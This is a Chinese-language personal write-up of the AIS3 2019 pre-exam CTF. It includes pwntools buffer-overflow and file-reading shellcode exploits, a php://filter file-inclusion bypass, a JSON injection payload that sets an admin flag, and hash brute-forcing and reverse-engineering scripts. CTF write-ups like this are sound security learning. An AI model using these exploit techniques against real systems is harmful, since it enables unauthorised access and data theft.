---
title: AIS3 2019 pre-exam writeups+心得
date: 2019-05-31 14:50:18
categories:
- Writeup
tags:
- 比賽
- 心得
- CTF

---

參加過一次[AIS3](https://ais3.org/)(2018)，今年也打算挑戰看看，去年場地是辦在台科大，而今年是在交大，所以有提供住宿，但一切的的前提都建立在我有進第二階段。
在5/25~5/27有為期三天的CTF，目的在篩選出可以參加暑期課程的學員，預計正取150人、備取30人。

<img src="https://i.imgur.com/eLCBDy1.png" width="870">

這次解了10題，是去年的兩倍，自認是有點進步了，但還是很渺小QQ

## 官方解法

* Web
    * [AIS3 2019 Pre-Exam 官方解法](https://blog.djosix.com/ais3-2019-pre-exam-%E5%AE%98%E6%96%B9%E8%A7%A3%E6%B3%95/)
      * https://github.com/djosix/AIS3-2019-Pre-Exam
    * https://github.com/w181496/AIS3-PreExam-2019

* Crypto
    * https://maojui.me/
      * https://github.com/maojui/writeups/tree/master/AIS32019

* Reverse
    * [2019::AIS3::前測官方解](http://blog.terrynini.tw/tw/2019-AIS3-%E5%89%8D%E6%B8%AC%E5%AE%98%E6%96%B9%E8%A7%A3/)
      * https://github.com/terrynini/AIS3_2019_challenges

* Pwn
    * https://github.com/yuawn/ais3-2019-pre-exam

## Pwn

### Welcome BOF

簡單的bof，但是題目敘述有說 `ubuntu 18.04`，所以我在本地測出來的padding長度是$48+8$但是在remote是$48$

TODO: 使用18.04去test

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(arch='i386', os='linux')
_ATT = 0
_local = 1

host = "pre-exam-pwn.ais3.org"
port = "10000"

if _local:
	r = process('./bof')
else:
	r = remote(host, port)

if _ATT:
	log.info('Waiting for attach...')
	raw_input()

welcome_to_ais3_2019 = 0x0000000000400687

# dunno whyyyy
payload='A' * (48)
payload += p64(welcome_to_ais3_2019)

print r.recvline()
r.sendline(payload)
r.interactive()
```

```
AIS3{TOO0O0O0O0OO0O0OOo0o0o0o00_EASY}
```

### orw

這題只允許`open`, `read` 和 `write` 這幾個syscall

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(arch='amd64', os='linux') # amd64
_ATT = 0
_local = 0

host = "pre-exam-pwn.ais3.org"
port = "10001"

if _local:
	r = process('./orw')
else:
	r = remote(host, port)

if _ATT:
	log.info('Waiting for attach...')
	raw_input()

sc = asm(
	'''
		jmp start
	orw:
		mov rax, 0x2
		pop rdi
		xor rsi, rsi
		xor rdx, rdx
		syscall

		mov rdi, rax
		xor rax, rax
		mov rsi, rsp
		mov rdx, 0x30
		syscall

		xor rax, rax
		mov al, 1
		xor rdi, rdi
		mov rdi, 1
		syscall

		mov al, 0x3c
		syscall

	start:
		call orw
		.ascii "/home/orw/flag"
		.byte 0
	'''
	)

print len(sc)
payload = 'A' * (32+8)
payload += p64(0x006010a0)

print r.recvline()
r.sendline(sc)

print r.recvline()
r.sendline(payload)

r.interactive()
```

```
AIS3{B4by_sh311c0d1ng_yeeeeeeeeeeeeeeeeeee_:)}
```

---
pwn還有看的就是hello這題，在之前學習pwn時，format string並沒有很懂，所以在賽中就邊摸編解地嘗試，但最後並沒有解出來。

* 沒解出來的
    * hello
    * PPAP
    * Secure bof
    * shellcode 2019
    * Box
    * Box++

## Reverse
### Trivial

簡單題，用disassembler打開來觀察，會發現驗證字串的function

<img src="https://i.imgur.com/WMN8xbI.png" width="400"/>

追進去就發現被一串切成1 byte的flag

<img src="https://i.imgur.com/NByfWMG.png" width="400"/>

```
AIS3{This_is_a_reallllllllllly_boariiing_challenge}
```

### TsaiBro

拖進disassembler看，在`main()`能看到它把flag的每個字元根據它在`ch[]`的位置做一些運算，然後輸出成`發財...發財...`的pair

<img src="https://i.imgur.com/FHmHAtk.png" width="400"/>

所以先對flag做一些處理（拔掉第一行，只留`.`

```
.... ...
..... ...
...... .....
....... .......
........ ......
.... .
....... ....
... .....
........ ........
....... ........
... ..
. .....
........ ........
. .
........ ........
. ..
....... .....
. .......
........ ........
. ......
....... ........
.. ......
........ ........
....... ....
. ......
........ ........
... ....
... ...
. .
.. .
. ..
... ..
.. .......
........ ........
.. ......
....... ....
... .......
........ .......

```

接著就寫code試flag出來

```cpp
#include <bits/stdc++.h>
using namespace std;

unsigned char ch[] = {
    0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6a, 0x6b, 0x6c,
    0x6d, 0x6e, 0x6f, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78,
    0x79, 0x7a, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4a,
    0x4b, 0x4c, 0x4d, 0x4e, 0x4f, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56,
    0x57, 0x58, 0x59, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38,
    0x39, 0x7b, 0x7d, 0x5f};
unsigned int ch_len = 64;

string flag;
string in1, in2;
int main(int argc,char *argv[])
{
  freopen("flag_proc.txt", "r", stdin);

  while(cin >> in1 >> in2)
  {
    int l = in1.length(), r = in2.length();
    int a, b;

    for(int i = 0; i < 10; i++)
    {
      for(int j = 0; j < ch_len; j++)
      {
        a = (j >> 0x1f) >> 0x1d;
        b = j;
        if (j < 0)
          b = j + 7;

        if( ((b >> 3) + 1) == l && (((j + a & 7) - a) + 1) == r)
        {
          // ch[j] == flag[i]
          flag += ch[j];
          break;
        }
      }
    }
  }
  unique(flag.begin(), flag.end());
  cout << flag << '\n';

  return 0;
}
```

```
AIS3{y0u_4re_a_b1g_f4n_0f_tsaibro_n0w}
```

### HolyGrenade

這題是給一個`.pyc`檔，找了一下工具[uncompyle6](https://github.com/rocky/python-uncompyle6/)，接著就解開`.pyc`檔。

```
$ uncompyle6 HolyGrenade.pyc
```

* `HolyGrenade.py`
```py
from secret import flag
from hashlib import md5

def OO0o(arg):
    arg = bytearray(arg, 'ascii')
    for Oo0Ooo in range(0, len(arg), 4):
        O0O0OO0O0O0 = arg[Oo0Ooo]
        iiiii = arg[(Oo0Ooo + 1)]
        ooo0OO = arg[(Oo0Ooo + 2)]
        II1 = arg[(Oo0Ooo + 3)]
        arg[Oo0Ooo + 2] = II1
        arg[Oo0Ooo + 1] = O0O0OO0O0O0
        arg[Oo0Ooo + 3] = iiiii
        arg[Oo0Ooo] = ooo0OO

    return arg.decode('ascii')


flag += '0' * (len(flag) % 4)
for Oo0Ooo in range(0, len(flag), 4):
    print(OO0o(md5(bytes(flag[Oo0Ooo:Oo0Ooo + 4])).hexdigest()))
```

整理一下src：它把flag每四個一組，拿去md5，接著做一些交換，所以只要把位置換回來，再去crack md5就好。

```py
from secret import flag
from hashlib import md5

def enc(arg):
    arg = bytearray(arg, 'ascii')
    for i in range(0, len(arg), 4):
        a = arg[i]
        b = arg[(i + 1)]
        c = arg[(i + 2)]
        d = arg[(i + 3)]
        arg[i] = c
        arg[i + 1] = a
        arg[i + 2] = d
        arg[i + 3] = b
    return arg.decode('ascii')

def dec(arg):
    arg = bytearray(arg, 'ascii')

    for i in range(0, len(arg), 4):
        c = arg[i]
        a = arg[i + 1]
        d = arg[i + 2]
        b = arg[i + 3]
        arg[i] = a
        arg[(i + 1)] = b
        arg[(i + 2)] = c
        arg[(i + 3)] = d
    return arg.decode('ascii')

flag += '0' * (len(flag) % 4)

for i in range(0, len(flag), 4):
    print(flag[i:i+4])
    # print(md5(bytes(flag[i:i + 4], 'ascii')).hexdigest())
    print(dec(enc(md5(bytes(flag[i:i + 4], 'ascii')).hexdigest())))
```

因為每個md5都是由4byte的字串hash而來，所以還可以暴力踹

```py
from hashlib import md5
import sys, string

hl = \
['aab3fb739ad2d154fe856818d66b6427'
,'343e0b500b25058ed52de927ca6bbd87'
,'dc719b0b22f0fc5a6dfbfc0ee60c70a8'
,'cd9e8edd75eb88b7873d9eab7dd685fe'
,'6d740b3c874058ca047ab375ecb662f6'
,'18fed6fa3fcf748e9530a6e10296c446'
,'73d9c19bea1d91abb5f0f4eb24e9f567'
,'a05e1b0e95d57c4566877d1b7eb27872']

m = {}
flag = [None] * len(hl)
for i, j in enumerate(hl):
    m[j] = i
cp = 0

for i in string.printable:
    for j in string.printable:
        for k in string.printable:
            for l in string.printable:
                s = i+j+k+l
                ha = md5(s.encode('ascii')).hexdigest()
                if ha in hl:
                    flag[m[ha]] = s
                    cp +=1
                if cp == len(hl):
                    print(''.join(flag))
                    sys.exit(0)
        print('.', flush=True, end='')
```

賽後問別人的解法，他說md5拿online tool就可以解了。

```
AIS3{7here_15_the_k1ll3r_ra661t}
```

### OneWay

這題題目敘述是一方通行ww
這題我賽中沒解出來，賽後問別人是說不要直接解hash，而是要用JPG檔頭去回推密文。

```py
import string

orig = [0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46,
        0x00, 0x01, 0x01, 0x01, 0x00, 0x48, 0x00, 0x48, 0x00, 0x00]

enc = [0x91, 0xb1, 0x91, 0x89, 0x32, 0x22, 0x23, 0x22, 0x20, 0x22,
       0x6e, 0x6e, 0x75, 0x68, 0x61, 0x3e, 0x65, 0x38, 0x65, 0x74]

s = string.ascii_lowercase + string.digits

key = []

for i, j in zip(orig, enc):
    if chr(i^j) not in s:
        for t in range(256):
            if chr(t^j) in s:
                print chr(t^j),
        print ''
    else:
        print chr(i^j)
    key.append(j ^ i)
```

得到輸出：
```
n
i
n
i
2
2
i
d
i
d
n
o
t
i <== 這個字是錯的，根據上下文字猜測是`h`
a
v
e
p
e
t
```

將密文輸入至程式，得到[flag](https://i.imgur.com/6IaMGr5.jpg)
```
-----
I encrypted a image in this binary,
you have to answer my questions to decrypt it,
cuz only my friends can view this secret image
-----
Who am I? (lowercase)
nini
How old am I?
22
What the name of my first pet? (lowercase)
ididnothavepet
nini22ididnothavepet, 8932587927620123215, 20, 177593you got my secret photo
```

* [jpg格式參考](https://github.com/corkami/formats/blob/master/image/jpeg.md)

---
* 沒解出來的
    * oneway
    * MasterPiece
    * Game
    * BigO1

## Web
### d1v1n6

LFI讀出`index.php`，當直接把`?path=index.php`時，會發現有過濾掉flag字串，而利用`php://filter`可以將字串做處理後，再輸出，bypass檢查。然而後面這部我是用假解，因為題目原本會擋掉`127.0.0.1`，但是regex寫壞了，所以`http://localhost`可以過。接著一樣用`php:filter`讀出。

```
$ echo RkxBR18xNGQ2NTE4OTY2OWYwNWQyMDY3NjRjOWRlNDQxNDc0ZC50eHQ= | base64 -d
FLAG_14d65189669f05d206764c9de441474d.txt
```

訪問`FLAG_14d65189669f05d206764c9de441474d.txt`得到flag：

```
                 ^`.                     o
 ^_              \  \                  o  o
 \ \             {   \                 o
 {  \           /     `~~~--__
 {   \___----~~'              `~~-_     ______          _____
  \                         /// a  `~._(_||___)________/___
  / /~~~~-, ,__.    ,      ///  __,,,,)      o  ______/    \
  \/      \/    `~~~;   ,---~~-_`~= \ \------o-'            \
                   /   /            / /
                  '._.'           _/_/
                                  ';|\
Your flag:
  AIS3{600d_j0b_bu7_7h15_15_n07_7h3_3nd}

Hints for d1v1n6 d33p3r:
- Find the other web server in the internal network.
- Scanning is forbidden and not necessary.

```

### Hidden

beautify之後，直接執行其中一段js。

<img src="https://i.imgur.com/UAzT6dc.png" witdh="400"/>

## Misc

### Are you admin

題目會輸入姓名跟年齡，接著會放進string中，給json parser解析：

`string = "{\"name\":\"#{name}\",\"is_admin\":\"no\", \"age\":\"#{age}\"}"`

目標：在json inject`"is_admin":"yes"`，只要讓`res["is_admin"] == "yes"`即可，

```
name = ","is_admin":"yes","2":[{"1":"
age =  3"}],"1":"1
```

```
AIS3{RuBy_js0n_i5_s0_w3ird_0_o}
```

### kcufsj

如題，jsfuck的rev，所以把內容反過來，接著evaluate即可

```
AIS3{R33v33rs33_JSFUCKKKKKK}
```

## Crypto

### THash

題目會把字串的每個字元拿去md5跟sha256，接著$\% 64$。把`cand`的每個字都拿去hash，建成一張表，由於模除64的緣故，會有一個數字對到許多字元的情況，但只要一個字元同時出現在兩張表中，他就是flag，寫個script即可。

```py
from hashlib import md5,sha256
cand = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPWRSTUVWXYZ1234567890@,- _{}'

md5_2c = {}
sha256_2c = {}

md5s = [41, 63, 46, 51, 6, 26, 42, 50, 44, 33, 29, 50, 27, 28, 30, 17, 31, 19, 46, 50, 33, 45, 26, 26, 29, 31, 52, 33, 1, 45, 31, 22, 50, 50, 50, 50, 50, 31, 22, 50, 44, 26, 44, 49, 50, 49, 26, 45, 31, 30, 22, 44, 30, 31, 17, 50, 50, 50, 31, 43, 52, 50, 53, 31, 30, 17, 26, 31, 46, 41, 44, 26, 31, 52, 50, 30, 31, 26, 39, 31, 46, 33, 27, 1, 42, 50, 31, 30, 12, 26, 27, 52, 31, 30, 12, 31, 46, 26, 27, 14, 50, 31, 22, 52, 33, 31, 41, 50, 46, 31, 22, 23, 41, 31, 53, 26, 21, 31, 33, 30, 31, 19, 39, 51, 33, 30, 39, 51, 12, 58, 60, 31, 41, 33, 53, 31, 3, 17, 50, 31, 51, 26, 29, 52, 31, 33, 22, 26, 31, 41, 51, 54, 41, 29, 52, 31, 19, 23, 33, 30, 44, 26, 27, 38, 8, 50, 29, 15]
sha256s = [61, 44, 3, 14, 22, 41, 43, 30, 49, 59, 58, 30, 11, 3, 24, 35, 40, 46, 3, 42, 59, 36, 41, 41, 41, 40, 9, 59, 23, 36, 40, 33, 42, 42, 42, 42, 42, 40, 44, 42, 49, 24, 49, 28, 42, 33, 24, 36, 40, 24, 33, 10, 24, 40, 35, 42, 42, 42, 40, 39, 9, 42, 3, 40, 24, 35, 24, 40, 3, 61, 49, 24, 40, 9, 42, 24, 40, 41, 17, 40, 12, 57, 11, 23, 43, 42, 40, 24, 18, 41, 11, 9, 40, 24, 18, 40, 3, 41, 11, 12, 42, 40, 44, 9, 59, 40, 61, 42, 3, 40, 44, 13, 61, 40, 3, 24, 29, 40, 59, 24, 40, 19, 18, 6, 59, 24, 18, 6, 22, 0, 39, 40, 61, 57, 3, 40, 17, 35, 42, 40, 58, 24, 58, 9, 40, 59, 44, 24, 40, 61, 48, 52, 61, 58, 9, 40, 19, 13, 59, 24, 53, 41, 11, 55, 55, 42, 58, 18]

for i in cand:
	md5_2c.setdefault(int(md5(i.encode()).hexdigest(), 16) % 64, []).append(i)
	sha256_2c.setdefault(int(sha256(i.encode()).hexdigest(), 16) % 64, []).append(i)

for i, j in zip(md5s, sha256s):
	for a in md5_2c[i]:
		if a in sha256_2c[j]:
			print(a, end='')
```

這題的flag挺有趣的www
```
AIS3{0N_May_16th @Sead00g said Heeeee ReMEMBerEd tH4t heee UseD thE SAME set 0f On1iNe to01s to S01Ve Rsa AeS RCA DE5 at T-cat-cup, AnD 7he kEys aRE AlWWAys TCat2019Key}
```

## 反省

這次CTF打下來，我發現了我犯了許多錯誤：在奇怪的地方拘泥太久，像是Crystal Maze那題，我的script一直出錯，花了許多時間在debug上，但最後還是沒解出來（明明是水題orz），後來去問朋友才發現用手推就可以（再度orz，搞不好我花在debug的時間，可以去解其他題目）；這代表著我的程式撰寫還是不夠，仍然沒辦法隨心應手的寫出想到的邏輯。
再來就是基礎知識不足，常常有些東西我只聽過名詞而已，但都沒花時間去理解、實作、復現，這兩點是我仍需加強的地方。
